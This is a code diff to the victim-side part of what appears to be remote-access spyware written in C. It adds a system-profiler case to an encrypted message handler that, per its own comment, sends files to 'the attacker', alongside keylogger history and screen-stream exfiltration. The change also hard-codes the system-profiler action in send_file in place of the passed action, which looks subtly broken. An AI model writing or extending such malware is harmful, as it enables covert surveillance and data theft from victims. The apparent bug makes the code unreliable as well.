@@ -46,7 +46,9 @@ void V_2_S_encrypted_message_handler(main_data data, action_type action){ // vic
 			strcpy(encrypted_message.data.keylogger_stream_key, encrypt_text(data.keylogger_stream_key, AES_KEY));
 			
 			break;
-			
+		
+		// all these options result in sending to the attacker a file. the encryption of the file is in the "send_file" function
+		case GET_SYSTEM_PROFILER :
 		case GET_KEYLOGGER_HISTORY :
 		case GET_SCREEN_STREAM :
 			strcpy(encrypted_message.data.file_data.file_sub_buffer, data.file_data.file_sub_buffer);
@@ -82,10 +84,10 @@ void send_file (char * file_name, action_type action, bool convert_to_base64_and
 	data.file_data.end_of_file = 0;
 	while (fgets(sub_buffer, sizeof(sub_buffer), base64_file_descriptor) != NULL) {
 		strcpy(data.file_data.file_sub_buffer, sub_buffer);
-		V_2_S_encrypted_message_handler(data, action);
+		V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
 	}
 	data.file_data.end_of_file = 1;
-	V_2_S_encrypted_message_handler(data, action);
+	V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
 	pclose(base64_file_descriptor);
 }
 
